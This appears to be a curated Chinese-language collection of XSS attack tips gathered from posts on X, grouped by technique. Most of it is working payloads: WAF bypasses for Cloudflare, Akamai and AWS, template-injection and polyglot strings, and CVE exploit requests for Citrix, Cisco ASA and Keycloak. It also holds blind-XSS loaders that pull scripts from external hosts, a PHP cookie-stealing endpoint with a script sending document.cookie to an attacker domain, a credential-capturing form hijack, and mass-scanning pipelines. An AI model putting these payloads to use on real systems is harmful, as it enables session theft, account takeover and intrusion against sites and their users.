# X 语料 · XSS 跨站脚本（2）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

原文件是 2021-12 至 2023-08 的流水，同一载荷被反复转贴：
CRLF→XSS 3 次、`%09Jav%09ascript:` 4 次、Cloudflare `self[/*foo*/'alert']` 3 次、
Citrix CVE-2023-24488 4 次、XML 载体 3 次、Akamai `top[/al/.source]` 2 次、
`{{define "T1"}}` 2 次。此处按**技术原理**重组，同原理合并。

剔除：纯战绩播报（"P3 but duplicate"）、YouTube 引流、
与 XSS 无关的 recon 片段（Shodan dorks、nmap mongo、reversewhois）、
以及载荷被图片吞掉只剩标题的空条目。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[XSS](../by-type/xss.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-xss-1（300 条）、x-xss-3（266 条）、x-exp-xss（209 条）、x-residual-xss（111 条） · 本文 861 行

## 判定：先看反射上下文

- 别只测已有参数。**自己造参数**也行，很多反射点藏在没人测过的名字上：
  ```
  #fragment=123
  ?query=123
  ```
  加一个随机参数名，看它是否被原样吐回。
- **XSS 与 SSTI 别搞混**，混了会漏掉一个 RCE。
  先发 `{{7*7}}`，回显 `14` 就是 SSTI，不是 XSS。
  找到 XSS 之后顺手也测一遍 SSTI。
- 输入落进 `href` 属性时，**不需要闭合引号**：
  ```
  <a href="user_input">
  → <a href="javascript:alert(1)">
  ```
- 只有 `<>` 被 HTML 编码（且落在属性内）时：
  ```
  "onmouseover="alert(1)
  '-alert(1)-'
  ```
- 落在 JS 字符串内，`<>` 和双引号被编码、单引号被转义：
  ```
  \'-alert(1)//
  ```
- 落在 JS 里且可闭合分号：
  ```
  ';alert(1)//
  ```
- 落在模板字符串内，所有特殊字符被 Unicode 转义时——转义对 `${}` 无效：
  ```
  ${alert(1)}
  ```
- 落在 `onclick` 属性内，`<>` 和双引号被 HTML 编码：
  ```
  http://foo?&apos;-alert(1)-&apos;
  ```
- **多处反射**，一处输入多个反射点：
  ```
  同一输入 2 处反射：*/alert()</script><script>/*
  两个输入各一处：  p1 = <svg/1='        p2 = 'onload=alert()>
  ```
  参考 `brutelogic.com.br/blog/multi-reflection-xss/`。
- 过滤拦住了完整的 `alert("")` / `onerror=""` 时，看站点是否把
  **姓名/公司名等字段拼接**后渲染。前半段放开头、后半段放结尾，中间的应用逻辑会帮你合体。
- 拼接式 post-based XSS 的写法，前缀后缀都塞随机串便于定位：
  ```
  KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
  ```
- 端点返回 JSON 时，在 URL 后接 `;.html`，可能骗浏览器按 HTML 渲染：
  ```
  /api/users → /api/users;.html
  ```
- JSON 响应里的弱 XSS，加个 `type=html` 就变成真 XSS：
  ```
  GET /vuln?query="><svg/onload=alert(9)>&type=html
  ```
- Chrome **不会**对路径里的单引号做 URL 编码，但会编码查询串里的。
  同一载荷放路径能过、放参数不能过，别以为是 WAF。
- URL 被整体编码时，末尾接 `#`（`%23`）有时能破坏编码：
  ```
  被编码：<a href=javascript%3Aalert(1)//>
  绕过：  <a href=javascript:alert(1)//#>
  ```
- `lookhere` 是很实用的**定位串**：先用它找出所有反射位置，再逐步加闭合符号。
  ```
  lookhere');}</script>
  lookhere");<%2Fscript>
  lookhere');});</script>
  ```
- 从自己的 hash 里取载荷执行，便于绕过长度限制：
  ```
  "><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>
  ```
- 多步流程里的 XSS：Repeater 里测不出来，就把 **Intercept 打开**，
  在页面上正常提交表单，一路 Forward 到那个带反射的请求再改。
- Shodan 按 title 排序，挑数字少的（老旧面板）。
  看到 `/user/frmLogon2.asp` 就试 `/user/frmLogon1.asp`，常有未修的 POST XSS。
- 发现「XSS」之前先做一次 HTML 注入确认：发 `<h1>test</h1>`，
  标签被渲染了才开始上盲打载荷。
## 最小闭合与通用反射载荷
- `">` 这一条真的够用，别跳过：
  ```
  ">
  ```
  被大量重复发布本身就说明它在很多目标上成立。
  ```
  "><"
  ```
- 闭合 HTML 注释：
  ```
  --!>
  ```
  ```
  <script>window['alert'](document['cookie'])</script>
  ```
  ```
  "></script><script>alert(document.domain)</script>
  ```
  ```
  %27%2B%3C%2FScripT%3E%3CScRIpT%3Eprompt%28document.domain%29%3C%2FscRIpT%3E%2B%27
  ```
  ```
  %22%3E%3Cscript%3Ealert(1)%3C/script%3E
  ```
  ```
  "><body%20onload%3Dalert(1)>
  ```
- 隐藏参数，前两版都被 WAF 拦，第三版通：
  ```
  ?parameter=<script>alert()</script>            → 拦
  ?parameter="><script>alert()</script>"          → 拦
  ?parameter="><svg/src=x onerror=onload=alert()>" → 通过
  ```
- 闭合与否结果相反，注意「被转义的」和「没闭合的」两种形态：
  ```
  <svg onload=alert(1)>    → 被服务端转义
  <svg onload=alert(1)<    → 未处理，触发
  ```
  ```
  <image src=x onerror=alert(1)>
  ```
- 站点会把 `(` 换成 `/`，改用反引号：
  ```
  "><image src=x onerror=alert`test`>
  ```
- `script`/`svg`/`img`/`iframe` 全被拦，但 `h1`、`b`、`u` 能过时：
  ```
  <h1/onmouseover=alert(document.domain)>Xss
  ```
  鼠标移到**文字**上也触发，不必是图片。
  ```
  "><div/onmouseover='alert("naplon")'>xss
  ```
  ```
  <svg/onload=confirm`69`")>
  <svg/onload=confirm(69)">)>
  ```
- （XMB Forum，CVE-2021-29399）
  BBCode 嵌套，`onmouseover` 落在生成的 `[url]` 里：
  ```
  [url]http://a[url=http://onmouseover=alert(1)//]a[/url][/url]
  ```
- 十六进制转义字母：
  ```
  <h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
  ```
- 标签全被拦时的通用替代：
  ```
  "><details/open/ontoggle=alert(document.domain)>
  ```
- `plaintext` 会吞掉后续所有标签解析，用来做长载荷的前缀：
  ```
  ">>" ></plaintext ></| ><plaintext/onmouseover=prompt(1) >Tryharder'-->"
  ```
  ```
  <s<script>cript>alert()</s<script>cript>
  ```
- `<svg>` 里的脚本**必须**有 `</script>`，其它标签在后继已有 script 块时可省：
  ```
  <svg><script xlink:href=data:,alert(1)>
  ```
- `.` 被过滤，`document.domain` 改用下划线变量名，靠 `with` 兜住：
  ```
  <svg onload=with(document)alert(domain)>
  ```
- `math`/`mtext`/`mglyph` 命名空间错乱 + CDATA：
  ```
  <math><mtext><table><mglyph><style><![CDATA[</style>
  ```
- PyScript 把八进制转义当字符串解析，等于直接得到标记：
  ```
  <py-script>
  print('\74img/src/onerror\75alert(1)\76')
  </py-script>
  ```
  `print()` 都不是必需的：
  ```
  <py-script>
  '\74img/src/onerror\75alert(1)\76'
  </py-script>
  ```
- Cloudflare 特别吃这个词——**保留 `on`** 就能过，不必是真事件：
  ```
  <svg/Animation/onload=alert(1)>
  <svg/hackerone/onload=alert(1)>
  '">one,two<svg/onload=alert(1)>
  ```
- 事件处理器被拦时先试空白与分隔符变形：
  ```
  <svg/onload =alert (1);>
  <svg//////onload =alert (1);>
  <svg id=x; onload =alert (1);>
  <svg id='x' onload =alert (1);>
  ```
- NUL 字节 + Unicode 转义：
  ```
  <fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
  ```
  ```
  <iframe+/ON+onload=%20alert(/str0d/)>
  ```
- 标签被拦时改用 `marquee`/`animate`：
  ```
  <marquee onstart=alert(1)>XSS</marquee>
  <svg><animate onbegin=alert(1) dur=1s>
  ```
- 折腾一晚最后通的是最简单的：
  ```
  <button/onclick="confirm(document.domain+document.cookie)">CLICK</button>
  ```
  `onmouseover` 同理。
  ```
  <svg><animate onend=alert(document.cookie) attributeName=x dur=1s>
  <svg><animate onbegin=prompt(document.domain) attributeName=x dur=1s>
  ```
- hash 取载荷 + 动态插 script：
  ```
  <svg onload=eval(location.hash.slice(1))>
  #with(document)body.appendChild(createElement('script')).src='//domain'
  ```
- `disabled` 的输入框也能触发，只要用户选中并复制：
  ```
  <input disabled=disabled onbeforecopy=alert(1) value=copyme>
  ```
  `onbeforecut` 同样有效，Chrome 实测可用。
- 图片文件名本身是反射点：
  ```
  12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img
  ```
  双重 `scr<script>ipt` 用于穿过会剥一层标签的过滤器。
- 整段 Unicode 转义：
  ```
  \u003e\u003cimg src=1 onerror=alert(9)\u003e
  ```
- 源码里只看到空反射时，`srcdoc` 是个常被忽略的入口：
  ```
  <iframe srcdoc=""></iframe>
  ```
- 属性注入 + 铺满视口：
  ```
  <abdool attr=" --- x="=='='onmouseover=confirm`abdool` style="display:block;width:1000px;height:1000px;background:red"> --- ">
  ```
- JSON 数组形态：
  ```
  ["');alert('XSS');//"]
  ```
- 无需任何特殊字符，靠 `contentEditable` + `location.hash` 拼出协议：
  ```
  <java contentEditable='' autofocus='' onfocus=location=tagName+innerHTML+location.hash>script:/*#*/alert(1)
  ```
## 关键字过滤：无括号、无 alert
- 载荷本身以三个反引号结尾，所以这里用四反引号围栏：
  ````
  [].pop.constructor`alert\x281\x29```
  ````
  ```
  new Function`a\l\ert\`1\``
  ```
- `alert()` 被拦时的替代品，安全团队常只黑名单 alert：
  ```
  confirm / prompt / eval / write
  ```
- `alert(...)` 本身的变体：
  ```
  alert(/xss/.source)
  window[/alert/.source](8)
  ```
- `document.cookie` 的四种写法：
  ```
  with(document)alert(cookie)
  alert(document['cookie'])
  alert(document[/cookie/.source])
  alert(document[/coo/.source+/kie/.source])
  ```
  ```
  <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
  ```
- 用原型污染 + `replace` 拼出函数名：
  ```
  '"><script>Object.prototype.evilXSS=function(xss,trigger){return this.split(xss).join(trigger);};xss='evil\a\l\ert\(\'evil1\')evil'.evilXSS('evil','');[].filter.constructor('evilaughahal(xss)'.replace('ilaughah',''))();</script>
  ```
- 无括号加载外部脚本：
  ```
  s=document.createElement`script`;
  s.src="//path.to/external.js";
  document["body"].append`${s}`
  ```
- 规模化：直接把 Angular 表达式塞进 path 参数，用响应匹配筛：
  ```
  cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("
  ```
## WAF 绕过
### Cloudflare
- WordFence 7.5.7 同样适用——双重编码 + `&#0000000040`（超长实体编码的 `(`）：
  ```
  xss">x%253Csvg%2520onload=alert%26%230000000040"1")%253E
  ```
- 实体编码的左括号，两种写法：
  ```
  <svg onload=prompt%26%230000000040document.domain)>
  <svg onload=prompt%26%23x000000028;document.domain)>
  ```
- 注释切分数组下标：
  ```
  "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
  ```
- 这条在整份语料里被转得最多，体量最小：
  ```
  "><svg on onload=(alert)(document.domain)>
  ```
  编码版：`"><svg on onload%3d(alert)(document.domain)>`
  前缀版：`test<svg on onload=(alert)(document.domain)>`
- **ESI 注释**插进关键字中间，绕开连续字符串匹配：
  ```
  被拦：<input type="text" value=`` <div/autofocus/onfocus='alert("XSS")’>X</div>
  绕过：<input type="text" value=`` <div/autofocus/onfo<!--esi-->cus='a<!--esi-->lert("XSS")’>X</div>
  ```
  ```
  "><svg%20onload=alert%26%230000000040"mysanismine")>
  ```
  作者备注：除 Firefox 外全平台生效。
  ```
  %22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)
  ```
  ```
  <svg onload=alert&#0000000040document.cookie)>
  ```
  ```
  "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
  ```
- 同族写法，`^` 用来截断表达式：
  ```
  <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
  ```
- NUL 字节插在属性名中间：
  ```
  "onx+%00+onpointerenter%3dalert(domain)+x"
  ```
- 极简版，`Only` 这个伪属性是关键：
  ```
  <Svg Only=1 OnLoad=confirm(1)>
  ```
  ```
  <svg onload=%0Aalert`1`>
  ```
  ```
  <svg on =i onload=alert(domain)
  ```
- 一次给出的六种备选，实测逐个换：
  ```
  <svg onload=prompt%26%23x000000028;document.domain)>
  <svg onload=%0Aalert1>
  <svg onload=alert%26%230000000040"1")>
  %2sscript%2ualert()%2s/script%2u
  <svg on onload=(alert)(document.domain)>
  <svg onload=alert%26%230000000040"")>
  ```
- `noembed` 吞标签解析，`</delect>` 是故意的错拼：
  ```
  <select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
  ```
- `srcdoc` + 实体编码的尖括号：
  ```
  xss'''><iframe srcdoc='%26it;script>;prompt`
  ${document.domain}`%26it;/script>'>
  ```
  ```
  <svg/onload=location/**/='https://GH0ST.xss.ht/'+document.domument.domument.domain…>
  ```
- 整个载荷 base64，服务端解码后回显：
  ```
  <ScRiPt >confirm(1)</ScRiPt>            → 拦
  PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg== → 通过
  ```
- Tab/换行塞进属性名与等号之间：
  ```
  "><A%0aoNMOusEoVER%09=%09(prompt(document.domain,document.cookie))``%0dx>
  ```
- `redirectUrl` 落进 JS 时，用 `var{a:...}` + `throw` 起手（`%2520` 是二次编码的空格）：
  ```
  /login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
  ```
- 开放重定向里 `javascript:` 被部分过滤时的四段递进：
  ```
  javascript:alert(1)
  javascript:%61lert(1)
  javascript:&#37&#54&#49lert(1)
  javascript:%26%2337%26%2354%26%2349lert(1)
  ```
### Akamai
  ```
  "><svg+onload=confirm(document.domain)>
  ```
  ```
  <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
  ```
- 从自己的 hash 里取代码执行：
  ```
  <svg onauxclick=(eval)(location.href.split('#')[1])>
  ```
- 右键触发，Akamai 上很稳：
  ```
  <details onauxclick=confirm`xss`></details>
  ```
- ASP 系把同名参数逗号拼接，用**参数污染**把标签拆开：
  ```
  ?id=1&id=2                        → Hello 1,2
  ?id=<a&id=><script+&id=>a=alert&id=a(1)//&id=</script+&id=>  → Hello <a,><script ,>a=alert,a(1)//,</script ,>
  ```
- 字符串拼接拼出 `javascript:confirm(...)`：
  ```
  "><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
  ```
- 盲打取 cookie，`Reflect.get` 避开 `.cookie` 字面量：
  ```
  "><input autofocus nope="%26quot;x%26quot;"onfocus="frames.location='YOUR_ENDPOINT?c='+Reflect.get(document,'coo'+'kie')">
  ```
### Sucuri
- 用 `1/4` `3/4` 和 `¢` 替换 `<` `>` `'`：
  ```
  1/4script3/4alert(¢xss¢)1/4/script3/4
  ```
### AWS WAF
- 在载荷前加 `<!` 就行：
  ```
  <!<script>alert(1)</script>
  ```
### 通用
- `onXXX`、`<a href`、`<script` 全被拦时，用 form 的 action：
  ```
  <form action=javascript:alert(1)>
  <input type=submit />
  </form>
  ```
- 判定协议黑名单的四个步骤：
  ```
  1. <a href=https://example[.]com>       ✅
  2. <a href=aaa:bbb>                     ✅
  3. <a href=javascript:bbb>              ❌
  4. <a href=jav%26%23x61%3bscript:alert()> 💥
  ```
- 先搞清楚**到底过滤了什么**：括号被拦就换 `%28` 或 `%26%2340;`；
  字符之间塞 `%0a%0d%20`；不行就双重 URL 编码。
- 应用在值前面硬加 `https://` 时，把目标域名塞进载荷里凑数：
  ```
  javascript:alert('https://'+document.cookie)
  ```
- `{{ }}` 被拦，用 `%00` 填充：
  ```
  {{constructor.constructor('alert(1)')()}}          → 无反应
  {%00{constructor.constructor('alert(1)')()}%00}    → 触发
  ```
- 开放重定向的注入载荷，换行/制表符比编码更有效：
  ```
  ";alert(0);//
  java%0d%0ascript%0d%0a:alert(0)
  j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
  java%07script:prompt`0`
  java%09scrip%07t:prompt`0`
  ```
- `/?back=` 参数不接受 `javascript://alert(1)`，改用 Tab 分隔关键字：
  ```
  %09Jav%09ascript:alert(document.domain)
  ```
  同一个 $4,500 案例被反复引用，说明这条确实好用。
  ```
  javascript://%0aalert(1)
  javascript://%250aalert(1)
  ```
  双重编码版用于服务端会再解一次的情况。
- 十进制实体编码的 `j` 和 `s`：
  ```
  url=%26%2302java%26%23115cript:alert(document.domain)
  ```
- AWS 之外的 WAF 上，`<!` 之外的做法是把标签名骨架化：
  ```
  <s<script>cript>alert()</s<script>cript>
  ```
## CSP 与模板注入
- Cloudflare 过了但 CSP 拦了 `alert`，换 iframe 里执行：
  ```
  1 - "><<svg onload=alert&#0000000040document.cookie)>      被 CSP 拦
  2 - "><<iframe onx=() onload=(alert)(6)>                  通过
  ```
- AngularJS 客户端模板注入，按版本分：
  ```
  ≥1.6.0：       {{constructor.constructor('alert(1)')()}}
  1.2.24-1.2.29：{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}
  ```
- Grafana 的 snapshot 端点：
  ```
  dashboard/snapshot/%7B%7Bconstructor. constructor ('alert (1) ) ()%7D%7D?orgId=0
  ```
- Cloudflare 绕过与模板注入一箭双雕：
  ```
  {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
  ```
- 姓名/简介字段同时试 XSS 与 CSTI：
  ```
  "style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
  {{_c.constructor('alert(1)')()}}
  {{constructor.constructor('alert(1)')()}}
  ```
- XSS + SQLi + CSTI 一次撒完：
  ```
  '"><svg/onload=prompt(5);>{{7*7}}
  ```
- Go 模板的 SSTI，用来绕 HTML 净化：
  ```
  {{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
  ```
  ```
  {{ &lt;svg/onload=prompt(&quot;XSS&quot;)&gt; }}
  ```
- ERB 与多标签闭合混在一起的 polyglot：
  ```
  test+”<%= 7*7 %>’(</script></style></title></textarea><svg/onload=al\u0065rt`1`>)
  ```
- 注册/登录框一次试完 XSS 与模板注入：
  ```
  test+(<script>alert(0)</script>)@example.com
  test@example(<script>alert(0)</script>).com
  "<%= 7 * 7 %>"@example.com
  test+(${{7*7}})@exam.com
  ```
- Swagger-UI 的 `configUrl` 从 XSS 直达账号接管：
  ```
  hxxp://x.x.x.x/index.html?configUrl=https://tearful-earth.surge.sh/test.json
  ```
## Polyglot
- 一条覆盖多语境，`jaVasCript:` 起手、注释块收尾：
  ```
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ```
- 同一思路的另一版，带 `Base` 做相对路径劫持：
  ```
  JavaScript://%250Aalert?.(1)//
  '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
  </Title/</Style/</Script/</textArea/</iFrame/</noScript>
  \74k<K/contentEditable/autoFocus/OnFocus=
  /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
  ```
- 短版，无 script 标签：
  ```
  javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
  ```
  ```
  </teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(document.cookie)//>\x3e
  ```
## Blind XSS
- 先确认 HTML 注入成立，再上盲打：
  ```
  "><NOSCRIPT><p title="</NOSCRIPT><script src=https://xxxx.xss(.)ht></script>">
  ```
  ```
  <noscript><p title="</noscript>">
  ```
  WordPress 一类把 title 属性直接输出的场景。
- wayback 收 URL → 去参数值 → dalfox 带 blind 回连：
  ```
  waybackurls http://Example.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt \
    && cat Possible_xss.txt | dalfox -b http://blind.xss.ht pipe > output.txt
  ```
- 从 UA 头打：
  ```
  cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUNTER></script>"
  ```
- 参数维度批量加：
  ```
  subfinder -d target[.]com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
  ```
- `X-Forwarded-For` 头：
  ```
  subfinder -d http://target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
  ```
- Android 设备的**设备名**也是输入点：
  ```
  "><script/src=//yourserver.xss.ht>//"
  ```
- 盲打载荷里**别带 `xss` 字样和数字**，后端日志检索会把它筛掉：
  ```
  差："><script src=//bxss.com/attack.js>
  差："><script src=//test098.bxss.com/attack.js>
  ```
- xss.report 的路径式回连：
  ```
  '"></script><script src=//xss.report/s/yourserver></script>
  ```
- 用 `">` 而不是 `<script>`：`<script>` 只在首次解析时执行，
  页面加载后追加的 `img` 类标签仍会触发。
- 存储型的最短验证路径：改名字字段 → 保存 → **登出** → 重新登录。
  不登出常常看不到，因为渲染发生在会话初始化时。
- 公司名塞 `">`，再邀请一个用户，临时邮箱里弹出对话框——
  这种「注册时自己看不到、邀请别人才能看到」的路径要特别留意。
- 未鉴权头被反射进响应体，且带 `Cache-Control: public, max-age=500`：
  响应被缓存后，所有用户都会拿到带载荷的版本 → 存储型 XSS 接管。
- Host 头注入到重置密码邮件：
  ```
  POST /admin/forgot_password HTTP/1.1
  Host: web..com">
  ```
  ```
  X-Forwarded-Host: bing .com">
  ```
- 自助式聊天机器人的完整链路：
  1. 建账号，新建 FAQ 分类时用载荷 → 只触发 self-XSS
  2. 邀请新用户
  3. 受害者打开 `https://chatbot.*.*/app/flow/edit/id`，载荷在**他**的会话里执行
## 文件上传与文档载体
- SVG 里用 `xlink:href` 加载外部脚本：
  ```
  <svg version="1.1" baseProfile="full" xmlns="http://w3.org/2000/svg" xmlns:xlink="http://w3.org/1999/xlink" >
   <script type="text/javascript" xlink:href="URL"></script>
  </svg>
  ```
- 后缀过滤的常规绕法：
  ```
  .htaccess ← 先传它
  file.svg  ← 直接是 XSS
  file.SVg  ← 大小写
  file.'svg ← 非法后缀
  ```
- 文件名同时塞多种注入：
  ```
  ->             路径穿越
  sleep(10)--    SQLi
  <svg /png      XSS
  ; sleep 10;    命令注入
  ```
- SVG 上传后不回显在自己页面，去找**文件真正存放的位置**，在那里才触发。
  403 有时用 `;` 加穿越就能破：
  ```
  example[.]com              → 403
  example[.]com/;%2f..%2f..%2f%2f → 200
  ```
- POST 型 XSS / CSRF 的一行 PoC，不需要托管页面：
  ```
  data:text/html;base64,<Base64 here>
  ```
  流程：Burp 生成 CSRF PoC → 复制 HTML → Base64 编码 → 拼到上面。
- PHP 侧的取 cookie 端点：
  ```php
  <?php
   $cookie = $_GET['cookie'];
   file_put_contents('cookies.txt', $cookie, FILE_APPEND);
  ?>
  ```
  配合 SVG 里的：
  ```
  <script>document.location='http://yourdomain.com/steal.php?cookie='+document.cookie;</script>
  ```
## 特殊上下文与已知 CVE
- 邮件系统的地址字段本身就是注入点，三种形态：
  ```
  test+(<script>alert(0)</script>)@domain.com
  test@domain(<script>alert(0)</script>).com
  "<script>alert(0)</script>"@domain.com
  ```
- 邮箱输入框 70% 的人不测，值得优先试：
  ```
  "<img/src/onerror=alert(0)"@xss.com
  ```
- Jira 的反射点清单（`/pages/*.vm` 那条直接用 IFRAME）：
  ```
  /secure/QueryComponent!Default.jspa
  /secure/ViewUserHover.jspa
  /ViewUserHover.jspa?username=Admin
  /rest/api/2/dashboard?maxResults=100
  /pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
  /rest/api/2/user/picker?query=admin
  ```
  ```
  http://jira.test.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.cookie…)
  ```
- SAP NetWeaver 的 `/irj/portal/`：把这段从 URL 删掉，在剩下的位置注入载荷。
  作者用这一条报了一百多个。
- Django debug 页（CVE-2017-12794）：
  ```
  http://redacted/create_user/?username=<script>alert(/XSS/)</script>
  ```
- （CVE-2020-3580，Cisco ASA 未授权 POST XSS）
  ```
  POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
  Host: example.tld

  SAMLResponse="><svg/onload=alert('SL4X0')&gt;
  ```
- （CVE-2023-24488）
  Citrix Gateway 未授权反射型 XSS：
  ```
  /oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
  ```
  发现方式：`inurl:/vpn/logout.html` 做 dork，`http.title:"Citrix gateway"` 做 Shodan。
  `nuclei -l target.txt -t CVE-2023-24488.yaml`。
  被转贴 5 次，基本可以确定当时大面积到期。
- （CVE-2021-20323，Keycloak）
  ```
  curl -v -X POST {BaseURL}/realms/master/clients-registrations/default -H "Content-type: application/json" -d "{\"\":1}"
  ```
- （CVE-2023-29489，cPanel）
  ```
  nuclei -t http/cves/2023/CVE-2023-29489.yaml
  ```
- SQLi 的 `concat` 直接拼出 script 标签：
  ```
  concat(0x3c7363726970743e70726f6d70742822,0x3078336e30,0x7c7c,user(),0x7c7c,database(),0x222c646f63756d656e742e636f6f6b6965293c2f7363726970743e)
  ```
  解码后是 `<script>prompt("0x3n0||user()||database()",document.cookie)</script>`。
- RCE 不在范围内时的替代路径——用命令注入往 web 目录写一个页面：
  ```
  index.php?path=web;echo "<svg/onload=alert(1)>" > /var/www/html/uploads/x.html;# xx
  ```
- `jwt=` 参数会被解码后回显，把载荷塞进 JWT 里：
  ```
  url/dest?jwt=<含载荷的 token>
  ```
- JS 里 `postMessage` 监听器是 DOM XSS 的富矿，批量筛：
  ```
  cat hosts | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
  ```
  配套模板 `addeventlistener-message.yaml`。作者同期靠这个捞到一批 DOM XSS。
- postMessage XSS 的 PoC 要能取 localStorage，否则定级上不去：
  从目标域读 `localStorage` 再回传到攻击者域。
- 影响证明别用 `alert('alert')`。先判断会话存哪儿：
  ```
  cookie：       alert(document.cookie)
  localStorage： alert(localStorage.getItem('access_token'))
  ```
- DOM XSS 的经典 sink：
  ```
  document.write('... <script>alert(document.domain)</script> ...');
  ```
- 登录前的 XSS 可以偷凭据——改表单的 method 与 action：
  ```
  <script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://attack-server/');</script>
  ```
- Firefox 下 `target="_blank"` 的链接可以拿到 `document.cookie`，
  配合中键/Shift+Ctrl+Alt 点击，Chrome 上早就有类似路子。
  详见 `soroush.me/blog/2023/08/anchor-tag-xss-exploitation-in-firefox-with-target_blank/`。
- `password` 字段塞载荷，后台用户列表常直接回显：
  ```
  password="><svg/onload=prompt(1)>
  ```
## 自动化
  ```
  echo https://target[.]com | cariddi -intensive \
    | grep -Ev "(\.json|\.txt|\.xml\.js$|\.xml|\.css)" | sort -u \
    | grep -E "\?[a-zA-Z0-9_-]+\=[a-zA-Z0-9_-]+" | uro | dalfox pipe
  ```
  ```
  gau http://target.com | uro | grep '?' | sed -e 's/:80//g' -e 's/:443//g' -e 's/http:/https:/g' \
    -e 's/=/=Sirat%22%3E%3Ch1%3Exss123/g' | httpx -silent -ms '<h1>xss123'
  ```
  ```
  echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent \
    | qsreplace '\"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
  ```
  ```
  waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '\"><svg onload=confirm(1)>' \
    | airixss -payload "confirm(1)" | egrep -v 'Not'
  ```
  ```
  cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test \
    | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
  ```
  ```
  gospider -S URLS.txt -c 10 -d 5 \
    --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" \
    --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
  ```
  ```
  cat subdomains.txt | waybackurls >> wayback.txt
  cat subdomains.txt | hakrawler -depth 3 -plain >> spider.txt
  cat spider.txt wayback.txt | kxss
  ```
  ```
  assetfinder -subs-only *url* | httprobe | sort -u | waybackurls | gf xss \
    | qsreplace '">' | kxss | tee -a result.txt
  ```
- 参数名逐个过 ffuf：
  ```
  subfinder -silent -d *url* | waybackurls | gf xss | sed 's/=.*/=/g' | sed 's/URL: //g' \
    | qsreplace -a FUZZ | while read s; do ffuf -c -u $s -w ./words/wordlist.txt; done
  ```
- ffuf 自带多字典，不必写脚本：
  ```
  ffuf -w urls.txt:URL -w wordlist:FUZZ -u URL/FUZZ
  ```
- 找隐藏参数，两个工具各有取舍：
  ```
  ffuf -w ~/tools/wordlist/param.txt:PARAM -u "$1?PARAM=XSS" -mr "XSS" -c
  arjun -w ~/tools/wordlist/param.txt -u $1
  ```
  ```
  cat live_subs.txt | waybackurls | tee live_urls.txt
  cat live_subs.txt | gau | tee -a live_urls.txt
  sort live_urls.txt | uniq -i > final_urls.txt
  cat final_urls.txt | gf xss | tee xss_list.txt
  ```
- KnoXSS API 批量：
  ```
  echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss \
    | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\"" }' | sh
  ```
- `srcdoc` 直接进 qsreplace，一次扫所有参数：
  ```
  subfinder -silent -d urls.txt | waybackurls | gf xss | unfurl -u format %s://%d%p%q \
